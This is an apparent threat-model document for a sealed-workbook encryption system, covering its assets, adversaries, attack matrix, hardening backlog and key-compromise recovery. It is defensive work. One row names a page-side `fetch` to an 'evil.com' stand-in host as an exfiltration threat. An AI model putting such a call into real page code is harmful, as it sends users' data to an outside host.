# Threat model — Workbooks Studio

**Status:** living document. Updated as part of every C9 (security hardening) ticket. PR reviewers touching sealed-workbook code paths reference this doc to fill in their security-exit-criteria section.

**Scope:** the multi-party Workbooks Studio stack. Author seals a workbook → broker holds wrapped DEKs + evaluates policy → recipient daemon (or browser) authenticates and unlocks. Excludes IdP-internal threats (the customer's IdP is outside our trust boundary) and post-decryption recipient behavior (after a recipient sees cleartext, they've seen it — fundamental).

**Companion docs:**
- [`SECURITY_MODEL.md`](./SECURITY_MODEL.md) — single-user, single-machine model (page-side leak defenses, save-scan, CSP, keychain isolation). All of it still applies; this doc extends the picture.
- [`SECURITY_MODEL_MULTIPARTY.md`](./SECURITY_MODEL_MULTIPARTY.md) — the original multi-party design memo. Treat that as architectural intent; treat *this* doc as the current state + gap list.
- [`ENCRYPTED_FORMAT.md`](./ENCRYPTED_FORMAT.md) — the studio-v1 envelope on the wire.

**Tracker:** [`bd show core-l6n`](#) (C9 — security hardening epic).

---

## 1. Assets

What we are actually protecting, in priority order:

| Asset | Where it lives | Why it matters |
|---|---|---|
| **Workbook cleartext content** | Author's machine pre-seal; recipient daemon process memory post-unlock; recipient browser DOM during view | Loss = customer data exposure, the entire trust contract breaks. P0. |
| **Per-workbook DEKs (32 bytes, AES-256)** | Plaintext: author CLI at seal time + recipient daemon during decrypt. Wrapped: broker D1. | A leaked DEK + envelope = full content recovery. P0. |
| **Broker KEK (32 bytes, AES-256)** | Today: `BROKER_LOCAL_KEK` env var (dev) / wrangler secret (prod intent). | Compromise = recovery of every wrapped DEK in the broker's D1. The crown jewel. P0. |
| **Broker session bearer / cookie** | KV (broker), daemon process memory after `/v1/auth/exchange` | A live bearer = ability to call broker as that recipient until session TTL. Bounded blast radius (1h default), but can request DEK release for any workbook the recipient is policy-allowed for. P0. |
| **Broker lease signing key (Ed25519)** | wrangler secret | Forgery enables fake leases the daemon would accept as broker-issued. P0. |
| **Broker audit signing key (Ed25519)** | wrangler secret | Forgery breaks the audit chain's integrity guarantee. P1. |
| **Author signing key (per-machine Ed25519)** | OS keychain (macOS Keychain / Windows Credential Manager / Linux Secret Service) on the author's machine | Compromise = attacker can sign provenance assertions claiming to be the author. P1. |
| **Audit log** | Broker D1 + daemon-side append-only file | Loss = no accountability, customer-visible regulator-relevant claim breaks. P1. |
| **Per-workbook policy** | Broker D1 (canonical) + envelope meta tag (cleartext copy, hashed) | Tamper detection via `policy_hash` AD-binding on the wrapped DEK. P1. |
| **Recipient identity claims (sub, email, org)** | Broker session, broker audit log, daemon process memory, daemon audit log | PII; loss = privacy harm. P1. |
| **Recipient API keys (page-side secrets)** | OS keychain on recipient machine (existing secrets path) | Covered by [SECURITY_MODEL.md](./SECURITY_MODEL.md); listed here for completeness. P1. |

---

## 2. Actors and capabilities

Listed roughly in increasing order of capability. Each row says what the actor can do; mitigations follow in §4.

### A1 — Network observer (passive)

Sees encrypted traffic between recipient and broker, between author and broker, between broker and WorkOS. Can see TLS metadata (SNI, packet sizes, timing).

### A2 — Network attacker (active)

Pattern A1 plus can MITM in principle. Defended against by TLS + webpki-roots.

### A3 — Holder of a sealed file but not in policy

Has the bytes of a `.workbook.html` envelope, no broker-allowed identity. Can read public meta tags (workbook id, broker URL, policy hash). Cannot decrypt without a DEK release.

### A4 — Authenticated-but-not-allowed identity

Holds a valid WorkOS-federated identity, signs in via the broker, requests `/v1/workbooks/:id/key`. Policy evaluator denies; broker returns 403 + audits.

### A5 — Allowed recipient acting in bad faith

In policy. Gets a legitimate DEK release. Can decrypt the workbook and exfiltrate cleartext via screenshot, copy-paste, manual transcription. **Out of scope** — this is fundamental to any DRM-like system; we constrain via per-view policy partitioning (C2) and after-the-fact audit, not prevention.

### A6 — Compromised recipient device

Attacker has code execution on a recipient's machine while the daemon is running. Can read daemon process memory (with PTRACE / ReadProcessMemory), can read OS keychain (with user permission). Out of scope at the kernel level; *cached lease + stolen laptop* mitigated by C9.5 (local-credential gate).

### A7 — Compromised author device

Attacker has code execution on the author's machine. Can sign envelopes as the author, can register policies. *Out of scope for cleartext recovery* — content was already in attacker's reach. *Important for forgery* — without C9.4 (broker-pinned author keys), attacker can sign as the author from a different machine and recipients can't tell.

### A8 — Broker operator with read-only DB access

Sees: workbook ids, policies, wrapped DEKs (ciphertext), audit log, sessions, identity claims of every accessor. Cannot read cleartext content (broker never has it). Cannot recover wrapped DEKs without the KEK (separate secret).

### A9 — Broker operator with full code-execution access (rogue insider / compromised supply chain)

A8 plus can: log released DEKs as they pass through the worker, mint fake leases, falsify audit entries pre-write. **The defining adversary the multi-party model has to survive.** Mitigations are structural — KEK separation (§4 row "compromised broker tries to read workbook content"), append-only audit (C9.6), recipient-side independent audit copies (gap, see §6).

### A10 — Compromised WorkOS / IdP

Can mint identities, surface arbitrary claims. Defense: end-to-end OIDC token signature verification at broker (validates against IdP's published JWKS, not just WorkOS's claim). Partial — if WorkOS itself is compromised including JWKS proxying, full impersonation is possible. Accepted as a structural limit.

### A11 — Subpoena / legal compulsion of broker operator

Broker can be compelled to produce: workbook ids, policies, accessor identities, timestamps. Cannot be compelled to produce cleartext (doesn't have it). Cannot be compelled to produce wrapped DEKs in a usable form (without KEK). KEK-holder (KMS / Worker secret) compulsion is a separate matter — see §5 disaster recovery.

### A12 — Subpoena / legal compulsion of distribution channel

Email server, S3/R2, USB courier. Channel sees ciphertext bytes. Without a lease, decrypts to nothing.

---

## 3. Trust boundary

```
┌────────────────────┐        ┌─────────────────────┐        ┌──────────────────────┐
│  Author machine    │        │   Broker (CF Wkr)   │        │   Recipient machine  │
│  ──────────────    │        │   ──────────────    │        │   ────────────────   │
│  workbook-cli      │  ─reg→ │   D1 (wrapped DEKs, │        │   workbooksd          │
│  wrapStudio        │        │   policies, audit)  │ ─key+  │   envelope decrypt   │
│  c2pa_sign (ed25519│ POST   │   KV (sessions,     │ lease─→│   secrecy::SecretBox │
│   in OS keychain)  │ /key   │   auth state, dcode)│        │   keychain (secrets) │
└────────────────────┘        │   KEK (secret)      │        └──────────────────────┘
                              │   lease/audit keys  │                  ▲
                              └──────────┬──────────┘                  │
                                         │                             │
                                         ▼                             │
                              ┌─────────────────────┐  artifact (.workbook.html)
                              │   WorkOS / AuthKit  │  ────distributed out-of-band────
                              │   (identity proof)  │
                              └──────────┬──────────┘
                                         │ OIDC
                                         ▼
                              ┌─────────────────────┐
                              │  Recipient's IdP    │
                              │  (Okta/AzureAD/etc) │
                              └─────────────────────┘
```

**What's inside the trust boundary** (we are responsible for these):
- The broker (Cloudflare Worker), its KEK, its lease/audit signing keys.
- The daemon (`workbooksd`) running on the recipient's machine.
- The CLI (`workbook seal`) running on the author's machine.
- The Svelte SDK code shipped to the recipient's browser inside the workbook.

**What's outside** (we depend on but don't control):
- WorkOS as the OIDC federation provider.
- The recipient's own IdP.
- The recipient's OS, keychain, and browser.
- The author's OS and keychain.
- The TLS fabric (webpki-roots).
- The artifact distribution channel (email, R2, USB, links).

---

## 4. Attack matrix

Consolidates the multi-party threats from `SECURITY_MODEL_MULTIPARTY.md` and the single-machine threats from `SECURITY_MODEL.md`. New columns: **status** (✅ shipped / ⚠ partial / ❌ gap) and **ticket** (link to the closing work).

### 4.1 Sealed-workbook-specific threats

| # | Threat | Mitigation | Status | Ticket |
|---|---|---|---|---|
| 1 | Sealed file stolen in transit (A3, A12) | AES-256-GCM envelope; cleartext only inside policy-allowed daemon process. | ✅ | — |
| 2 | Authenticated-not-allowed identity requests DEK (A4) | Broker policy eval; deny + audit. | ✅ | core-1fi.1.7 |
| 3 | Compromised broker logs released DEKs (A9) | **Sealed-box DEK transport** — broker encrypts each DEK to recipient's per-session X25519 transport pubkey before return. Broker holds plaintext only momentarily. | ❌ | **C9.1** (`core-l6n.1`) |
| 4 | Compromised broker tries to recover all wrapped DEKs (A9) | KEK lives in a different security domain than broker compute. Today: env var (dev) / wrangler secret (prod intent). **Hardening: enforce wrangler-secret-only path; remove env-var fallback; rotation runbook.** | ⚠ | **C9.3** (`core-l6n.3`) |
| 5 | Subpoena targets broker (A11) | Broker structurally cannot produce cleartext. Audit log signed + chained. | ✅ | — |
| 6 | Stolen lease replayed by different recipient | Lease bound to (sub, broker_nonce) via HKDF; daemon verifies on use. | ⚠ (designed; bind-to-transport-pubkey lands with C9.1) | C9.1 |
| 7 | IdP revocation — old recipient still has cached lease | TTL bounds the window (default 1h online, 24h offline grace). Daemon refreshes at 80%. | ⚠ (refresh path lands with C1.9) | core-1fi.1.9 |
| 8 | Recipient extracts cleartext post-decrypt (A5) | Out of scope. View partitioning (C2) limits exposure; audit log records access. | ✅ accepted | core-1fi.2 |
| 9 | Tampered envelope claims forged sender / chain (A7) | C2PA chain signed with author's ed25519. **Today: per-machine key with no cross-machine attestation.** **Hardening: broker-pinned author public keys.** | ⚠ | **C9.4** (`core-l6n.4`) |
| 10 | Audit log tampering by broker insider (A9) | Audit entries chained (each includes `prev_hash`); recipients cache their own copy of entries on issuance. **Hardening: D1 trigger blocks UPDATE/DELETE on audit rows.** | ⚠ | **C9.6** (`core-l6n.6`) |
| 11 | MITM between daemon and broker (A2) | TLS via webpki-roots; `broker.signal.ml` + HSTS. *Long-term: cert pinning.* | ✅ (TLS); ⚠ (no pinning) | (post-MVP) |
| 12 | Broker key-release endpoint as enumeration oracle | Workbook ids are 128-bit random; auth required; uniform 401 on miss. | ✅ | core-1fi.1.7 |
| 13 | Daemon-host PII / secret leak via logs | `secrecy::SecretBox` for cleartext; `secrecy::SecretString` for bearer; `secrets-policy` for outbound proxy. **Hardening: PII redaction sweep across broker + daemon log lines.** | ⚠ | **C9.8** (`core-l6n.8`) |
| 14 | SSRF — `return_to` to internal network range | `safeReturnTo` in broker. Currently allows any localhost; **hardening: deny private-network ranges (10/8, 172.16/12, 192.168/16, 169.254/16, ::1, fc00::/7) other than literal 127.0.0.1**. | ⚠ | **C9.9** (`core-l6n.9`) |
| 15 | Stolen unlocked recipient laptop with cached lease (A6) | Cached lease + wrapped DEK in OS keychain. **Today no local-presence check.** **Hardening: Touch ID / Hello / polkit gesture before unwrap.** | ❌ | **C9.5** (`core-l6n.5`) |
| 16 | Cleartext lands on disk during open | Cleartext lives in `secrecy::SecretBox` only; never written to disk; not persisted to `sessions.tsv`. Daemon restart forces re-auth. | ✅ | core-1fi.1.8 |
| 17 | Constant-time secret compare violations (timing-leak class) | KV lookups for sessions / daemon codes are hash-keyed. **Hardening: audit any `===` on secret material in the broker's TS code.** | ⚠ | **C9.2** (`core-l6n.2`) |
| 18 | Embedded credential entry in workbook envelope (phishing surface for daemon-less recipients) | Architecture: never embed credential entry — the envelope only carries a redirect button to `auth.workbooks.sh`. WebAuthn origin-binding makes embedded passkey enrollment worthless anyway. Memory: [`project_auth_portal_direction.md`](#) — Pattern C. | ✅ accepted | core-1fi.1.12 (C1.14) |
| 19 | Untrusted UI claims provenance (sender / chain) (A7) | Pre-auth shell verifies the C2PA chain in-browser via WebCrypto **before** rendering any signed claim. Failure = visible "modified after signing" warning, never silent display. | ❌ (design only — depends on C8) | core-8 (C8.3) |
| 20 | OIDC token forgery by compromised WorkOS (A10) | End-to-end JWKS verification at broker on every token rather than trusting WorkOS-resigned claims. | ⚠ (designed; JWKS verification ticket open separately if not implemented) | (verify in code, file ticket if missing) |

### 4.2 Single-machine secrets-path threats

These are inherited from `SECURITY_MODEL.md` and apply to the recipient daemon's existing secrets/proxy path. They remain in force for sealed workbooks too:

| # | Threat | Mitigation | Status |
|---|---|---|---|
| S1 | Sharing a `.workbook.html` leaks secrets | Keys never in file; OS keychain. | ✅ |
| S2 | Malicious workbook reads another workbook's secrets on same daemon | Keychain entries namespaced by canonical-path-hash + `workbook_id`. | ✅ |
| S3 | Page-side `fetch("https://evil.com")` exfiltration | CSP `connect-src 'self'` + page-side fetch wrapper. | ✅ |
| S4 | Daemon as open relay for outbound proxy | Per-secret host allowlist from spec script. | ✅ |
| S5 | Token leak via Referer → CSRF | Origin header check on state-changing endpoints. | ✅ |
| S6 | Agent embeds key value in saved HTML | Save-time substring scan. | ✅ |
| S7 | Console leakage | SDK patches `console.*`. | ✅ |
| S8 | Plugin captures value via prototype monkeypatch | Page registry value lifetime ~10ms. | ✅ |
| S9 | Cross-origin between workbooks on same daemon (shared `localStorage`/IDB) | **Open gap** — keychain isolation works, but storage origin is shared. Per-token unique subdomain or per-workbook port deferred. | ❌ accepted (post-MVP) |

---

## 5. Hardening backlog

Each row maps to a `bd` ticket under `core-l6n`. Filed P0 = blocks production; P1 = ships in C1 GA; P2 = post-MVP.

| Ticket | Title | Priority | Blocks |
|---|---|---|---|
| `core-l6n.1` | C9.1 Sealed-box DEK transport | **P0** | C1.11 |
| `core-l6n.2` | C9.2 Constant-time secret compares | P1 | — |
| `core-l6n.3` | C9.3 Memory-only KEK in production | **P0** | GA |
| `core-l6n.4` | C9.4 Author key registration + verification | P1 | C8.3 |
| `core-l6n.5` | C9.5 Local-credential gate (cached lease open) | **P0** | C1.9 |
| `core-l6n.6` | C9.6 Append-only audit log (D1 constraint) | P1 | — |
| `core-l6n.7` | C9.7 THREAT_MODEL.md | **P0** | this doc |
| `core-l6n.8` | C9.8 Logging hygiene (PII redaction) | P1 | — |
| `core-l6n.9` | C9.9 SSRF guard tightening | P1 | — |

**Deferred (filed but not P0/P1) — accepted gaps documented for transparency:**

- **DPoP-style bearer proof-of-possession.** Today the bearer is replayable if a daemon process is compromised and the bearer is exfiltrated within the session TTL. DPoP would bind the bearer to a daemon-held private key. Cost (medium) currently outweighs benefit given short TTLs + post-MVP threat targeting.
- **Trillian-style transparency log for audit + author keys.** Real, valuable, expensive infrastructure. Defer to enterprise readiness epic (`core-1fi.5`).
- **TEE-backed broker (Confidential Computing).** Closes the rogue-broker-operator gap for cleartext access if/when the broker ever needed to handle cleartext (it doesn't today). Defer.
- **Cross-origin sandboxing per workbook on the daemon** (S9). Per-token subdomains or random ports for full origin isolation between workbooks on the same daemon. Real risk but bounded — the recipient owns all workbooks they open on their own machine.

---

## 6. Disaster recovery

### KEK compromise

If `BROKER_LOCAL_KEK` is exfiltrated:
1. Provision a new KEK; rotate via `wrangler secret put BROKER_LOCAL_KEK_v2`.
2. Read every wrapped DEK from D1, unwrap with old KEK, re-wrap with new KEK, write back. Idempotent migration, run as a one-off worker route.
3. Update `kek.ts` `kek_ref` to the new version. New wraps use new KEK; old wraps are migrated.
4. Notify customers — KEK rotation is not zero-impact (logs the rotation event, may trigger compliance reporting on their side depending on their regulatory regime).
5. Investigate and rotate any credentials potentially exposed at the same time.

**Runbook to be written as part of C9.3.**

### Lease signing key compromise

Forgery enables fake leases that the daemon accepts. Rotate immediately:
1. New keypair → new wrangler secret.
2. Daemon needs the new public key. Today: hardcoded; **gap**. Production needs a key-rollover protocol (multi-key daemon support, signed key rollover from the broker). File as follow-up.
3. Audit log entries from the rotation point onward can be trusted; pre-rotation entries cannot.

### Audit signing key compromise

Lower stakes — audit-log tampering becomes possible. Rotate; gap-detection via chain re-verification on already-stored entries.

### Author signing key compromise (per-machine)

Author re-runs key generation on a clean machine; broker pubkey registration (C9.4) updates the canonical pubkey. Recipients see "key rotated" assertion in the chain. Old assertions still verify against the old pubkey; new ones use the new key.

### Broker outage

Daemon-side lease cache (C1.9) provides offline grace. Multi-region deploy (Cloudflare Workers default). Long-term: self-hosted broker option (C5).

---

## 7. PR security exit-criteria template

Every PR touching sealed-workbook code paths includes this section in the description. Copy-paste, fill in. Reviewer treats blank or hand-waving answers as a request for revision.

```markdown
### Security exit criteria

**Threat model section touched:** [§4.1 row N / §4.2 row N / new]

**Attacks considered:**
- [ ] What an attacker with capability A_ can do against this code, and why this PR doesn't enable that.
- [ ] Side channels (timing, error messages, log content) that could leak information.
- [ ] Failure modes — what happens when this code is called with malformed / hostile / oversized input.
- [ ] State this PR adds to memory or disk; lifetime; zeroization; persistence-on-crash.

**Secret material handled:** [list — DEKs, bearer, KEK, signing keys, identity claims, none]
- [ ] Held in `SecretBox` / `SecretString` / equivalent.
- [ ] Not formatted in any log line, error message, or panic backtrace.
- [ ] Not written to disk in any code path of this PR.

**Verification:** how I confirmed the above.
- [ ] Test name(s) that exercise the failure mode.
- [ ] Manual smoke step (link to commands).
- [ ] Spec / RFC referenced.
```

PRs that don't touch sealed-workbook code can omit. PRs that touch the broker, the daemon's `envelope.rs` / `broker_client.rs` / sealed-workbook handlers, the wrapStudio CLI, or the `@workbooks/auth-ui` package include it.

---

## 8. Maintenance

This doc is updated as part of every C9 ticket. Pattern:
- Implementing a hardening ticket → update the relevant attack-matrix row's status (`⚠` → `✅`) and remove the ticket from §5.
- Discovering a new gap → add a row to §4.1, file a new C9.x ticket, add to §5.
- Major architecture change (new actor, new asset, new trust boundary) → §1–§3 updates, link to design doc.

When in doubt about whether something belongs in `SECURITY_MODEL.md` (single-machine), `SECURITY_MODEL_MULTIPARTY.md` (multi-party design intent), or here: this doc is the *current state + gap list*. The other two are *design intent + rationale*.
